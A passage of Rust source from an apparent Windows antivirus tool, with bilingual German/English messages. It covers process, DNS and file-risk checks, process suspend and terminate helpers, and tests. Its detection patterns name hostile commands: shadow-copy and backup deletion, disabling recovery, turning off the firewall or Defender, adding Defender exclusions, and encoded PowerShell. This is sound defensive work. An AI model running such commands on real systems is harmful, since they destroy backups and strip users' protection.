    }
    if let Some(what) = recovery_sabotage(&child, &cmd) {
        return Some((
            "RANSOMWARE:WIEDERHERSTELLUNG".into(),
            tf!("{what} – typisch für Ransomware vor dem Verschlüsseln", "{what} – typical for ransomware before encrypting"),
            Severity::Kritisch,
        ));
    }
    if let Some(what) = protection_switched_off(&child, &cmd) {
        return Some(("SCHUTZ:ABSCHALTEN".into(), tf!("{what} – Schadsoftware schaltet oft zuerst den Schutz von Windows ab", "{what} – malware often switches off the protection of Windows first"), Severity::Hoch));
    }
    None
}

/// A command that switches a protection of Windows off: the firewall or the Defender
/// (Windows-Sicherheit). Neither K9's own rules nor the Sigma rules of the package "core"
/// reported these in the sandbox test of 22.11.2026 (Testbericht 7.37).
fn protection_switched_off(child: &str, cmd: &str) -> Option<&'static str> {
    let ps = matches!(child, "powershell.exe" | "pwsh.exe");
    match child {
        "netsh.exe" if cmd.contains("advfirewall") && cmd.contains("state") && cmd.split_whitespace().any(|t| t == "off") => Some(t!("Die Windows-Firewall wird per Befehl abgeschaltet", "The Windows firewall is being switched off by a command")),
        "netsh.exe" if cmd.contains("firewall") && cmd.contains("opmode") && cmd.contains("disable") => Some(t!("Die Windows-Firewall wird per Befehl abgeschaltet", "The Windows firewall is being switched off by a command")),
        _ if ps && cmd.contains("set-mppreference") && cmd.contains("-disable") && !cmd.contains("$false") => Some(t!("Der Schutz von Windows-Sicherheit (Defender) wird per Befehl abgeschaltet", "The protection of Windows Security (Defender) is being switched off by a command")),
        _ if ps && cmd.contains("add-mppreference") && cmd.contains("-exclusion") => Some(t!("In Windows-Sicherheit (Defender) wird per Befehl eine Ausnahme eingetragen", "An exclusion is being added to Windows Security (Defender) by a command")),
        "sc.exe" | "net.exe" | "net1.exe" if cmd.contains("windefend") && (cmd.contains(" stop") || cmd.contains("disabled")) => Some(t!("Der Dienst von Windows-Sicherheit (Defender) wird per Befehl beendet oder deaktiviert", "The service of Windows Security (Defender) is being stopped or disabled by a command")),
        "sc.exe" | "net.exe" | "net1.exe" if cmd.contains("mpssvc") && (cmd.contains(" stop") || cmd.contains("disabled")) => Some(t!("Der Dienst der Windows-Firewall wird per Befehl beendet oder deaktiviert", "The service of the Windows firewall is being stopped or disabled by a command")),
        _ => None,
    }
}

/// PowerShell's -EncodedCommand in any accepted abbreviation (-e, -en, -enc, …, -ec)
/// followed by a Base64 block.
fn encoded_command(cmd: &str) -> bool {
    let tokens: Vec<&str> = cmd.split_whitespace().collect();
    tokens.windows(2).any(|w| {
        let flag = w[0].trim_start_matches(['-', '/']);
        let is_flag = w[0].len() > flag.len()
            && !flag.is_empty()
            && (flag == "ec" || "encodedcommand".starts_with(flag) && flag.starts_with('e'));
        let arg = w[1].trim_matches(['"', '\'']);
        is_flag && arg.len() >= 16 && arg.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '='))
    })
}

/// Deleting shadow copies or the backup catalogue, switching off Windows recovery.
fn recovery_sabotage(child: &str, cmd: &str) -> Option<&'static str> {
    match child {
        "vssadmin.exe" if cmd.contains("delete") && cmd.contains("shadow") => Some(t!("Schattenkopien werden gelöscht", "Shadow copies are being deleted")),
        "vssadmin.exe" if cmd.contains("resize") && cmd.contains("shadowstorage") => Some(t!("Speicher für Schattenkopien wird verkleinert", "The storage for shadow copies is being reduced")),
        "wmic.exe" if cmd.contains("shadowcopy") && cmd.contains("delete") => Some(t!("Schattenkopien werden gelöscht", "Shadow copies are being deleted")),
        "wbadmin.exe" if cmd.contains("delete") && (cmd.contains("catalog") || cmd.contains("backup")) => Some(t!("Sicherungskatalog wird gelöscht", "The backup catalogue is being deleted")),
        "bcdedit.exe" if cmd.contains("recoveryenabled") && cmd.contains("no") => Some(t!("Windows-Wiederherstellung wird abgeschaltet", "Windows recovery is being switched off")),
        "powershell.exe" | "pwsh.exe" if cmd.contains("win32_shadowcopy") && (cmd.contains("delete") || cmd.contains("remove-")) => {
            Some(t!("Schattenkopien werden gelöscht", "Shadow copies are being deleted"))
        }
        _ => None,
    }
}

/// Suspends all threads of a process (NtSuspendProcess). Never kills.
pub fn suspend_process(pid: u32) -> bool {
    process_call(pid, "NtSuspendProcess")
}

/// Lets a frozen process run again – completely, however often it was frozen. Windows counts
/// every freeze: several messages about one program (agent and service, seen with BlackBasta on
/// 21.11.2026: five) each froze it, and one "Freigabe" took only one of them back – the
/// program stayed frozen until every message was decided, and nothing told the user so.
/// Decided with the user on 22.11.2026: one release lets the program run.
pub fn resume_process(pid: u32) -> bool {
    let ok = process_call(pid, "NtResumeProcess");
    resume_threads(pid);
    ok
}

/// How often the most frozen thread of the process is still suspended (0: it runs). Lowers
/// nothing when `lower` is false.
fn resume_threads(pid: u32) -> u32 {
    thread_counts(pid, true)
}

/// For tests and logs: the highest suspend count among the threads of the process.
pub fn suspend_count(pid: u32) -> u32 {
    thread_counts(pid, false)
}

fn thread_counts(pid: u32, lower: bool) -> u32 {
    use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
    use windows::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, THREAD_SUSPEND_RESUME};
    let mut highest = 0;
    // SAFETY: snapshot and thread handles are closed below; plain calls with valid handles.
    unsafe {
        let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) else { return 0 };
        let mut e = THREADENTRY32 { dwSize: std::mem::size_of::<THREADENTRY32>() as u32, ..Default::default() };
        let mut more = Thread32First(snap, &mut e).is_ok();
        while more {
            if e.th32OwnerProcessID == pid {
                if let Ok(h) = OpenThread(THREAD_SUSPEND_RESUME, false, e.th32ThreadID) {
                    if lower {
                        // ResumeThread returns the count before the call: until it was 0 or 1.
                        for _ in 0..64 {
                            let before = ResumeThread(h);
                            if before == u32::MAX || before <= 1 {
                                break;
                            }
                        }
                    } else {
                        // The count can only be read by changing it: one up, one down.
                        let before = SuspendThread(h);
                        if before != u32::MAX {
                            let _ = ResumeThread(h);
                            highest = highest.max(before);
                        }
                    }
                    let _ = CloseHandle(h);
                }
            }
            more = Thread32Next(snap, &mut e).is_ok();
        }
        let _ = CloseHandle(snap);
    }
    highest
}

fn process_call(pid: u32, func: &str) -> bool {
    let Some(f) = ntdll(func) else { return false };
    let f: NtProcFn = unsafe { std::mem::transmute(f) };
    // SAFETY: handle closed below.
    unsafe {
        let Ok(h) = OpenProcess(PROCESS_SUSPEND_RESUME, false, pid) else { return false };
        let ok = f(h) >= 0;
        let _ = CloseHandle(h);
        ok
    }
}

/// Two start times of the same process (ETW event and process creation time) differ by
/// less than this (1 s, FILETIME units).
pub const SAME_START: i64 = 10_000_000;

/// Creation time of a running process (FILETIME).
pub fn process_start(pid: u32) -> Option<i64> {
    process_path_and_start(pid).map(|(_, s)| s)
}

/// Records the parent process ID (work folders follow the start chain even when the
/// process itself has already ended).
pub fn note_parent(f: &mut Finding, ppid: u32) {
    if let Some(d) = f.details.as_mut().and_then(|d| d.as_object_mut()) {
        d.insert("eltern_pid".into(), ppid.into());
    }
}

/// Records the start time of the process in a finding (needed for "Prozess beenden").
pub fn note_start(f: &mut Finding, start: Option<i64>) {
    if let (Some(d), Some(s)) = (f.details.as_mut().and_then(|d| d.as_object_mut()), start) {
        d.insert("startzeit".into(), s.into());
    }
}

/// Is `actual` (program and creation time of the process now running under the ID) the
/// process of the finding? Windows reuses process IDs quickly – program AND start time
/// must match, otherwise nothing is ended.
pub fn same_process(pid: u32, actual: Option<(PathBuf, i64)>, exe: &Path, start: i64) -> Result<(), String> {
    let Some((path, created)) = actual else {
        return Err(format!("Prozess {pid} läuft nicht mehr – nichts beendet"));
    };
    if !path.to_string_lossy().eq_ignore_ascii_case(&exe.to_string_lossy()) || (created - start).abs() > SAME_START {
        return Err(format!("Die Prozess-ID {pid} gehört inzwischen zu einem anderen Prozess – nichts beendet"));
    }
    Ok(())
}

/// Ends a process – only called after the user chose "Prozess beenden".
/// Checks that the pid still belongs to the expected program AND start time first.
pub fn terminate_process(pid: u32, expected_exe: Option<&Path>, expected_start: Option<i64>) -> anyhow::Result<()> {
    // Service: only with the user's rights (except for its own findings, see k9-dienst).
    crate::schutz::ensure_user_context()?;
    terminate_process_privileged(pid, expected_exe, expected_start)
}

/// Like `terminate_process` without the user-context check – only for the
/// service's own findings (values from its memory, not from the database).
pub fn terminate_process_privileged(pid: u32, expected_exe: Option<&Path>, expected_start: Option<i64>) -> anyhow::Result<()> {
    let (Some(exe), Some(start)) = (expected_exe.filter(|p| !p.as_os_str().is_empty()), expected_start) else {
        anyhow::bail!("Programm oder Startzeit des Prozesses {pid} unbekannt – nichts beendet (bitte im Task-Manager prüfen)");
    };
    same_process(pid, process_path_and_start(pid), exe, start).map_err(|e| anyhow::anyhow!(e))?;
    // SAFETY: handle closed below.
    unsafe {
        let h = OpenProcess(PROCESS_TERMINATE, false, pid)?;
        let r = TerminateProcess(h, 1);
        let _ = CloseHandle(h);
        r?;
    }
    Ok(())
}

// ================================================================= network

/// (pid, remote IPv4, remote port) of established/connecting TCP connections.
pub fn tcp_connections() -> Vec<(u32, Ipv4Addr, u16)> {
    let mut size = 0u32;
    // SAFETY: size query, then call with a buffer of that size.
    unsafe {
        let _ = GetExtendedTcpTable(None, &mut size, false, 2, TCP_TABLE_OWNER_PID_ALL, 0);
        if size == 0 {
            return Vec::new();
        }
        let mut buf = vec![0u64; (size as usize).div_ceil(8) + 64];
        size = (buf.len() * 8) as u32;
        if GetExtendedTcpTable(Some(buf.as_mut_ptr() as *mut c_void), &mut size, false, 2, TCP_TABLE_OWNER_PID_ALL, 0) != 0 {
            return Vec::new();
        }
        let table = &*(buf.as_ptr() as *const MIB_TCPTABLE_OWNER_PID);
        let rows = std::slice::from_raw_parts(table.table.as_ptr(), table.dwNumEntries as usize);
        rows.iter()
            .filter(|r| r.dwRemoteAddr != 0)
            .map(|r| {
                let ip = Ipv4Addr::from(r.dwRemoteAddr.to_le_bytes());
                let port = u16::from_be((r.dwRemotePort & 0xffff) as u16);
                (r.dwOwningPid, ip, port)
            })
            .filter(|(_, ip, _)| !ip.is_loopback() && !ip.is_private() && !ip.is_unspecified())
            .collect()
    }
}

#[repr(C)]
struct DnsCacheEntry {
    next: *mut DnsCacheEntry,
    name: *const u16,
    typ: u16,
    data_len: u16,
    flags: u32,
}

/// Host names in the Windows DNS client cache (recently resolved names).
/// Uses the undocumented but long-standing DnsGetCacheDataTable from dnsapi.dll.
pub fn dns_cache_names() -> Vec<String> {
    let lib = wide("dnsapi.dll");
    let mut out = Vec::new();
    // SAFETY: dynamic lookup; the list is walked read-only and freed with DnsFree.
    unsafe {
        let Ok(m) = LoadLibraryW(PCWSTR(lib.as_ptr())) else { return out };
        let Some(get) = GetProcAddress(m, PCSTR(c"DnsGetCacheDataTable".as_ptr() as *const u8)) else { return out };
        let free = GetProcAddress(m, PCSTR(c"DnsFree".as_ptr() as *const u8));
        let get: unsafe extern "system" fn(*mut *mut DnsCacheEntry) -> i32 = std::mem::transmute(get);
        let free: Option<unsafe extern "system" fn(*mut c_void, i32)> = free.map(|f| std::mem::transmute(f));
        let mut head: *mut DnsCacheEntry = std::ptr::null_mut();
        if get(&mut head) == 0 {
            return out;
        }
        let mut cur = head;
        while !cur.is_null() {
            let e = &*cur;
            if !e.name.is_null() {
                let mut len = 0;
                while *e.name.add(len) != 0 && len < 512 {
                    len += 1;
                }
                out.push(String::from_utf16_lossy(std::slice::from_raw_parts(e.name, len)).to_ascii_lowercase());
            }
            let next = e.next;
            if let Some(f) = free {
                if !e.name.is_null() {
                    f(e.name as *mut c_void, 1);
                }
                f(cur as *mut c_void, 1);
            }
            cur = next;
        }
    }
    out.sort();
    out.dedup();
    out
}

// ======================================================== removable drives

/// Does `path` lie on a removable drive (USB stick, SD card)?
pub fn is_removable(path: &Path) -> bool {
    let s = path.display().to_string();
    let b = s.as_bytes();
    if b.len() < 3 || !b[0].is_ascii_alphabetic() || b[1] != b':' {
        return false;
    }
    let w = wide(&format!("{}:\\", b[0] as char));
    // SAFETY: simple query with a terminated string. DRIVE_REMOVABLE = 2
    unsafe { GetDriveTypeW(PCWSTR(w.as_ptr())) == 2 }
}

/// Root paths of removable drives (USB sticks, SD cards).
pub fn removable_drives() -> Vec<PathBuf> {
    let mut out = Vec::new();
    // SAFETY: simple queries.
    let mask = unsafe { GetLogicalDrives() };
    for i in 0..26u32 {
        if mask & (1 << i) == 0 {
            continue;
        }
        let root = format!("{}:\\", (b'A' + i as u8) as char);
        let w = wide(&root);
        // DRIVE_REMOVABLE = 2
        if unsafe { GetDriveTypeW(PCWSTR(w.as_ptr())) } == 2 {
            out.push(PathBuf::from(root));
        }
    }
    out
}

/// The drives a full scan covers: built-in disks and plugged-in removable media
/// (no network drives, no CD/DVD drives, no RAM disks).
pub fn local_drives() -> Vec<PathBuf> {
    let mut out = Vec::new();
    // SAFETY: simple queries.
    let mask = unsafe { GetLogicalDrives() };
    for i in 0..26u32 {
        if mask & (1 << i) == 0 {
            continue;
        }
        let root = format!("{}:\\", (b'A' + i as u8) as char);
        let w = wide(&root);
        // DRIVE_REMOVABLE = 2, DRIVE_FIXED = 3
        if matches!(unsafe { GetDriveTypeW(PCWSTR(w.as_ptr())) }, 2 | 3) {
            out.push(PathBuf::from(root));
        }
    }
    out
}

const HIGH_RISK_EXT: [&str; 44] = [
    "exe", "dll", "scr", "com", "pif", "cpl", "sys", "msi", "msix", "msp", "appx", "bat", "cmd", "ps1", "psm1", "vbs",
    "vbe", "js", "jse", "wsf", "wsh", "hta", "lnk", "jar", "doc", "docm", "dotm", "xls", "xlsm", "xlam", "ppt", "pptm",
    "rtf", "one", "pdf", "zip", "7z", "rar", "iso", "img", "vhd", "cab", "gz", "tar",
];

/// Files worth the (more expensive) ClamAV check in real time: programs,
/// scripts, macro documents, archives, PDFs, installers – or anything that
/// starts like a Windows program (MZ header).
pub fn is_high_risk_file(path: &Path) -> bool {
    let ext = path.extension().map(|e| e.to_string_lossy().to_ascii_lowercase()).unwrap_or_default();
    if HIGH_RISK_EXT.contains(&ext.as_str()) {
        return true;
    }
    let mut head = [0u8; 2];
    std::fs::File::open(path).and_then(|mut f| std::io::Read::read_exact(&mut f, &mut head)).is_ok() && &head == b"MZ"
}

/// Builds a process finding (shared by the agent and the Windows service).
/// The location text contains no PID, so repeated identical starts stay one
/// open detection; the PID is kept in the details.
#[allow(clippy::too_many_arguments)]
pub fn process_finding(pid: u32, name: &str, exe: &str, cmd: &str, rule: &str, text: &str, sev: Severity, parent: &str, engine: &str) -> Finding {
    Finding {
        path: PathBuf::from(if parent.trim().is_empty() {
            tf!("Prozess {name}, gestartet von: unbekannt", "Process {name}, started by: unknown")
        } else {
            tf!("Prozess {name}, gestartet von {parent}", "Process {name}, started by {parent}")
        }),
        // Narrow fingerprint: rule + parent + exact (normalized) command line. A "Freigabe"
        // therefore allows only this one command, never powershell.exe in general.
        sha256: process_fingerprint(rule, parent, cmd),
        size: 0,
        rule_id: rule.to_string(),
        threat_name: text.to_string(),
        category: t!("Verdächtiges Verhalten", "Suspicious behaviour").into(),
        severity: sev,
        engine: engine.into(),
        kind: Kind::Prozess,
        details: Some(serde_json::json!({
            "pid": pid, "ziel": exe, "befehl": cmd, "eltern": parent,
            "hinweis": t!("Nichts wurde beendet. Wenn du das nicht selbst gestartet hast: „Prozess beenden“.", "Nothing was ended. If you did not start this yourself: “End process”.")
        })),
    }
}

/// Program that sent a DNS query (from the service's ETW events).
pub struct Asker<'a> {
    pub pid: u32,
    pub program: &'a str,
    pub cmd: &'a str,
}

/// Finding for a DNS query of a known malicious domain. With the asking
/// program the fingerprint is narrow: domain + program.
pub fn dns_finding(name: &str, domain: &str, src: &str, engine: &str, asker: Option<Asker>) -> Finding {
    // Phishing pages are visited (browser), malware domains are contacted by programs.
    let phishing = src == crate::phishing::PHISHFILTER_SOURCE;
    // The large list mixes malware, phishing and scam domains and is less exact than the others.
    let big_list = src == crate::sperrlisten::TIF_SOURCE;
    let tail = if phishing {
        t!("Phishing-Seite: Falls du dort Zugangsdaten eingegeben hast, ändere das Passwort sofort (von einem sicheren Gerät).", "Phishing page: if you entered sign-in data there, change the password at once (from a safe device).")
    } else if big_list {
        t!("Die Domain steht auf einer großen Sammelliste für Schadsoftware-, Phishing- und Betrugsseiten. Hast du die Seite selbst aufgerufen und nichts eingegeben oder geladen, genügt „Gesehen“. Sonst: Passwörter ändern, die du dort eingegeben hast, und einen vollständigen Scan starten.", "The domain is on a large combined list of malware, phishing and scam sites. If you opened the page yourself and entered or downloaded nothing, “Seen” is enough. Otherwise: change the passwords you entered there and start a full scan.")
    } else {
        t!("Bitte Autostarts prüfen und einen vollständigen Scan starten.", "Please check the autostarts and start a full scan.")
    };
    let (hinweis, path, fp, extra) = match &asker {
        Some(a) => {
            let prog = file_label(a.program);
            let who = if prog.eq_ignore_ascii_case("svchost.exe") {
                tf!("dem Windows-DNS-Dienst (svchost.exe, PID {}) – das eigentlich fragende Programm ist nicht bekannt", "the Windows DNS service (svchost.exe, PID {}) – the program that really asked is not known", a.pid)
            } else {
                format!("{prog} (PID {})", a.pid)
            };
            (
                tf!("Abgefragt von {who}. {tail}", "Queried by {who}. {tail}"),
                tf!("DNS-Abfrage: {name}, abgefragt von {prog}", "DNS query: {name}, queried by {prog}"),
                format!("dns|{domain}|{}", a.program.to_lowercase()),
                serde_json::json!({ "pid": a.pid, "programm": a.program, "befehl": a.cmd }),
            )
        }
        None => (
            tf!("Ein Programm oder der Browser hat diese Adresse angefragt. {tail}", "A program or the browser asked for this address. {tail}"),
            tf!("DNS-Abfrage: {name}", "DNS query: {name}"),
            format!("dns|{domain}"),
            serde_json::json!({}),
        ),
    };
    let mut details = serde_json::json!({ "url": name, "quelle": src, "hinweis": hinweis });
    if let (Some(d), Some(e)) = (details.as_object_mut(), extra.as_object()) {
        d.extend(e.clone());
    }
    Finding {
        path: PathBuf::from(path),
        sha256: crate::sha256_hex(fp.as_bytes()),
        size: 0,
        rule_id: format!("NETZ:DNS:{src}"),
        threat_name: if phishing {
            tf!("Dieser PC hat die Phishing-Domain {domain} aufgelöst ({src})", "This PC resolved the phishing domain {domain} ({src})")
        } else if big_list {
            tf!("Dieser PC hat die als schädlich gelistete Domain {domain} aufgelöst ({src})", "This PC resolved the domain {domain}, which is listed as harmful ({src})")
        } else {
            tf!("Dieser PC hat die Schad-Domain {domain} aufgelöst ({src})", "This PC resolved the malicious domain {domain} ({src})")
        },
        category: if phishing { "Phishing".into() } else { t!("Schad-Verbindung", "Malicious connection").into() },
        severity: if phishing || big_list { Severity::Mittel } else { Severity::Hoch },
        engine: engine.into(),
        kind: Kind::Url,
        details: Some(details),
    }
}

/// Finding for a DNS query of a domain that imitates a well-known brand.
pub fn lookalike_finding(name: &str, hit: &crate::phishing::Hit, engine: &str, asker: Option<Asker>) -> Finding {
    let mut f = dns_finding(name, &hit.registrable, "Ähnliche Domain", engine, asker);
    f.rule_id = "PHISHING:AEHNLICH".into();
    f.threat_name = tf!("Mögliche Phishing-Domain {} – ähnelt {} ({})", "Possible phishing domain {} – resembles {} ({})", hit.registrable, hit.brand, hit.how);
    f.category = "Phishing".into();
    f.severity = Severity::Mittel;
    if let Some(d) = f.details.as_mut().and_then(|d| d.as_object_mut()) {
        let asked = d.get("hinweis").and_then(|h| h.as_str()).and_then(|h| h.split(". ").next()).unwrap_or("").to_string();
        d.insert("marke".into(), hit.brand.clone().into());
        d.insert(
            "hinweis".into(),
            tf!(
                "{asked}. Die Adresse sieht aus wie {}, gehört aber nicht dazu. Gib dort keine Zugangsdaten ein; falls doch: Passwort sofort ändern. Gehört die Adresse wirklich zu dir oder dem Anbieter, wähle „Freigabe“.", "{asked}. The address looks like {} but does not belong to it. Do not enter sign-in data there; if you did: change the password at once. If the address really belongs to you or the provider, choose “Allow”.",
                hit.brand
            )
            .into(),
        );
    }
    f
}

fn file_label(p: &str) -> &str {
    p.rsplit(['\\', '/']).next().unwrap_or(p)
}

/// Fingerprint of a process finding: rule, parent image and the normalized
/// full command line (lower case, collapsed whitespace).
pub fn process_fingerprint(rule: &str, parent: &str, cmd: &str) -> String {
    // Pipe names and window handles change with every start (native messaging).
    let norm: String = cmd
        .split_whitespace()
        .map(|t| {
            let l = t.to_lowercase();
            if l.contains("\\\\.\\pipe\\") {
                "<pipe>".to_string()
            } else if let Some(rest) = l.strip_prefix("--parent-window=") {
                format!("--parent-window={}", if rest.ends_with('"') { "*\"" } else { "*" })
            } else {
                l
            }
        })
        .collect::<Vec<_>>()
        .join(" ");
    crate::sha256_hex(format!("prozess-v2|{rule}|{}|{norm}", parent.to_lowercase()).as_bytes())
}

#[cfg(test)]
mod tests {

    #[test]
    fn an_english_process_finding_keeps_the_fingerprint() {
        use super::*;
        use crate::sprache::{with, Sprache};
        let make = || process_finding(1, "powershell.exe", r"C:\p.exe", "powershell -enc x", "PROZESSARGUMENTE:powershell.exe", "t", Severity::Hoch, "cmd.exe", "dienst");
        let (de, en) = (make(), with(Sprache::En, make));
        assert_eq!(de.sha256, en.sha256);
        assert_eq!(en.path, PathBuf::from("Process powershell.exe, started by cmd.exe"));
        assert_eq!(en.category, "Suspicious behaviour");
        assert!(en.details.unwrap()["hinweis"].as_str().unwrap().contains("End process"));
        assert_eq!(de.category, "Verdächtiges Verhalten");
    }
    #[test]
    fn working_folder_of_a_process_is_read() {
        let own = std::env::current_dir().unwrap();
        let got = super::process_current_dir(std::process::id()).expect("eigener Prozess lesbar");
        assert_eq!(got.to_string_lossy().to_lowercase(), own.to_string_lossy().trim_end_matches('\\').to_lowercase());
        assert_eq!(super::process_current_dir(4_000_000_000), None, "kein solcher Prozess");
    }

    use super::*;

    #[test]
    fn browser_caches_are_compressed_by_nature() {
        let p = |s: &str| PathBuf::from(s);
        assert!(is_browser_cache(&p("C:\\Users\\x\\AppData\\Local\\Temp\\claude\\a\\eps_1_91\\Default\\Cache\\Cache_Data\\f_000023")));
        assert!(is_browser_cache(&p("C:\\T\\eps_0_57\\VariationsSeedV2")));
        assert!(is_browser_cache(&p("C:\\T\\ep_9_0\\component_crx_cache\\abc")));
        assert!(is_browser_cache(&p("C:\\T\\Default\\Code Cache\\js\\1234")));
        assert!(naturally_high_entropy(&p("C:\\T\\scoped_dir1\\CRX_INSTALL\\x.woff")));
        assert!(is_browser_cache(&p("C:\\T\\msedge_url_fetcher_61300_2008560990\\4c1d5cd5-b559")));
        assert!(!is_browser_cache(&p("C:\\Users\\x\\Documents\\Vertrag.docx.locked")));
        assert!(!is_browser_cache(&p("C:\\Users\\x\\Documents\\Cache_Data")), "nur Dateien in einem Cache-Ordner");
        // #528 (23.11.2026): headless Edge writes its encrypted session state.
        assert!(is_browser_cache(&p("C:\\Users\\x\\AppData\\Local\\Temp\\HeadlessEdge66\\Default\\Sessions_Encrypted\\Session_13439939139402752")));
        assert!(is_browser_cache(&p("C:\\T\\Default\\Sessions_Encrypted\\Tabs_13439939139478433")));
        assert!(!is_browser_cache(&p("C:\\Users\\x\\Documents\\Sessions_Encrypted\\Vertrag.docx")), "nur Edges eigene Sitzungsdateien");
        assert!(!is_browser_cache(&p("C:\\Users\\x\\Documents\\Session_1.txt")));
    }

    #[test]
    fn git_data_is_recognised_by_content_never_by_path() {
        use std::io::Write;
        let dir = crate::test_tmp().join("git-objekte").join("objects").join("30");
        std::fs::create_dir_all(&dir).unwrap();
        // A real loose object: zlib("blob 1200\0" + content).
        let mut body = b"blob 1200\0".to_vec();
        body.extend((0..1200u32).map(|i| (i * 7919 % 251) as u8));
        let mut z = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        z.write_all(&body).unwrap();
        let obj = dir.join("31f0fc227bf35e1ad817fd5aa91525ecc30f9c");
        std::fs::write(&obj, z.finish().unwrap()).unwrap();
        assert!(naturally_high_entropy(&obj));
        // Random (encrypted-looking) bytes under exactly such a path still count as suspicious,
        // even with a zlib header.
        let fake = dir.join("df3a922baa9cf2468c7c284279dce317b09fdc20");
        let mut r = crate::random_bytes(4096);
        r[0] = 0x78;
        r[1] = 0x9c;
        std::fs::write(&fake, &r).unwrap();
        assert!(!naturally_high_entropy(&fake));
        // zlib, but no git header (e.g. a compressed document) -> not git
        let mut z = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        z.write_all(b"Vertrag Seite 1 ...").unwrap();
        let other = dir.join("aa3a922baa9cf2468c7c284279dce317b09fdc20");
        std::fs::write(&other, z.finish().unwrap()).unwrap();
        assert!(!naturally_high_entropy(&other));
        assert!(git_content(b"PACK\x00\x00\x00\x02\x00\x00\x00\x05"));
        assert!(git_content(b"\xfftOc\x00\x00\x00\x02"));
        assert!(!git_content(b"PACK\x00\x00\x00\x09"));
    }

    #[test]
    fn lookalike_and_phishing_findings_are_medium() {
        let hit = crate::phishing::Hit { registrable: "steamcomunity.com".into(), brand: "steamcommunity.com".into(), how: "Tippfehler-Domain" };
        let f = lookalike_finding("store.steamcomunity.com", &hit, "dienst", None);
        assert_eq!(f.severity, Severity::Mittel);
        assert_eq!(f.rule_id, "PHISHING:AEHNLICH");
        assert!(f.threat_name.contains("steamcommunity.com"));
        let g = dns_finding("x.phish.example", "phish.example", crate::phishing::PHISHFILTER_SOURCE, "dienst", None);
        assert_eq!((g.severity, g.category.as_str()), (Severity::Mittel, "Phishing"));
        assert_eq!(dns_finding("a.b", "a.b", "ThreatFox", "dienst", None).severity, Severity::Hoch);
    }

    #[test]
    fn dns_finding_names_the_program() {
        let a = Asker { pid: 7, program: "C:\\x\\evil.exe", cmd: "evil.exe -q" };
        let f = dns_finding("bad.example", "bad.example", "URLhaus", "dienst", Some(a));
        assert!(f.path.display().to_string().contains("evil.exe"));
        assert_eq!(f.details.as_ref().unwrap()["pid"], 7);
        let g = dns_finding("bad.example", "bad.example", "URLhaus", "dienst", None);
        assert_ne!(f.sha256, g.sha256);
        let s = Asker { pid: 9, program: "C:\\Windows\\System32\\svchost.exe", cmd: "" };
        let h = dns_finding("bad.example", "bad.example", "URLhaus", "dienst", Some(s));
        assert!(h.details.as_ref().unwrap()["hinweis"].as_str().unwrap().contains("DNS-Dienst"));
    }

    #[test]
    fn native_messaging_fingerprint_ignores_pipes_and_window() {
        let a = r#"cmd.exe /d /s /c ""C:\x\host.exe" chrome-extension://ohhcpmplhhiiaoiddkfboafbhiknefdf/ --parent-window=0" < \\.\pipe\chrome.nativeMessaging.in.1a > \\.\pipe\chrome.nativeMessaging.out.1a"#;
        let b = r#"cmd.exe /d /s /c ""C:\x\host.exe" chrome-extension://ohhcpmplhhiiaoiddkfboafbhiknefdf/ --parent-window=4711" < \\.\pipe\chrome.nativeMessaging.in.9f > \\.\pipe\chrome.nativeMessaging.out.9f"#;
        assert_eq!(process_fingerprint("R", "chrome.exe", a), process_fingerprint("R", "chrome.exe", b));
        let c = a.replace("host.exe", "evil.exe");
        assert_ne!(process_fingerprint("R", "chrome.exe", a), process_fingerprint("R", "chrome.exe", &c));
        // Unregistered helper: still reported.
        assert!(assess_process("chrome.exe", "cmd.exe", &c).is_some());
    }

    #[test]
    fn high_risk_files() {
        assert!(is_high_risk_file(Path::new("C:\\x\\Setup.EXE")));
        assert!(is_high_risk_file(Path::new("rechnung.pdf")));
        assert!(!is_high_risk_file(Path::new("urlaub.jpg")));
        let dir = std::env::current_dir().unwrap().join("target").join("hochrisiko-test");
        std::fs::create_dir_all(&dir).unwrap();
        let f = dir.join("getarnt.jpg");
        std::fs::write(&f, b"MZ\x90\x00").unwrap();
        assert!(is_high_risk_file(&f));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn process_finding_names_an_unknown_parent() {
        let f = process_finding(1, "powershell.exe", "", "powershell -e x", "R", "T", Severity::Hoch, "", "dienst");
        assert_eq!(f.path, PathBuf::from("Prozess powershell.exe, gestartet von: unbekannt"));
        let f = process_finding(1, "powershell.exe", "", "powershell -e x", "R", "T", Severity::Hoch, "cmd.exe", "dienst");
        assert_eq!(f.path, PathBuf::from("Prozess powershell.exe, gestartet von cmd.exe"));
    }

    #[test]
    fn process_fingerprint_is_narrow() {
        let a = process_fingerprint("PROZESSARGUMENTE:powershell.exe", "cmd.exe", "powershell -nop  -Command  Invoke-Expression $x");
        assert_eq!(a, process_fingerprint("PROZESSARGUMENTE:powershell.exe", "CMD.EXE", "PowerShell -nop -Command Invoke-Expression $x"));
        assert_ne!(a, process_fingerprint("PROZESSARGUMENTE:powershell.exe", "cmd.exe", "powershell -nop -Command Invoke-Expression $y"));
        assert_ne!(a, process_fingerprint("PROZESSARGUMENTE:powershell.exe", "winword.exe", "powershell -nop -Command Invoke-Expression $x"));
        assert_ne!(a, process_fingerprint("PROZESSKETTE:winword.exe>powershell.exe", "cmd.exe", "powershell -nop -Command Invoke-Expression $x"));
        let f = process_finding(42, "a.exe", "", "a", "R", "t", Severity::Mittel, "b.exe", "echtzeit");
        assert!(!f.path.display().to_string().contains("42"));
    }

    #[test]
    fn entropy_values() {
        assert!(entropy(&[0u8; 4096]) < 0.01);
        assert!(entropy(b"Hallo Welt, dies ist ein ganz normaler deutscher Text.".repeat(50).as_slice()) < 5.0);
        let random = crate::random_bytes(65536);
        assert!(entropy(&random) > 7.9);
    }

    #[test]
    fn burst_detection_simulated_encryption() {
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        let mut det = BurstDetector::new(Duration::from_secs(10), 20);
        let start = Instant::now();
        let mut alarm = None;
        for i in 0..30 {
            // simulated ransomware: overwrite documents with random bytes
            let p = dir.path().join(format!("brief{i}.txt"));
            std::fs::write(&p, crate::random_bytes(4096)).unwrap();
            let e = file_entropy(&p).unwrap();
